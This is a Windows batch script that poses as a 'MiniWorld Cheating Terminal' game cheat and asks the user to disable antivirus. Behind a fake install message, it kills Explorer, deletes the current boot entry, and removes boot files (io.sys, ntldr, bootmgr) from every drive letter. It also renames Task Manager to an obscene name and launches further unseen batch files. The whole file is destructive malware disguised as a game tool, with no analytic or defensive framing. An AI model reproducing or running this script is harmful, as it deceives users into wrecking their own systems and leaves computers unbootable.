@echo off

cls

echo MiniWorld Cheating Terminal
echo Please close all anti-virus application.
set/p option=Type MiniWorld Main Process: 
echo Installing MCT...
timeout /t 1 /nobreak
echo OK
cls
taskkill /f /im explorer.exe
bcdedit /delete {current}
c:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

d:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

e:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

f:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

g:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

h:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

i:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

j:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

k:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

l:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

m:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

n:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

o:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

p:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

q:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

r:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

s:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

t:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

u:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

v:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

w:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

x:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

y:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

z:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr


a:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

b:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr
cls
c:
cd \
cd windows
cd system32
attrib -s -r -h taskmgr.exe
ren taskmgr.exe fuckmini.exe
cd %windir%\..\MCT\
start .\for.bat
start .\run.bat
exit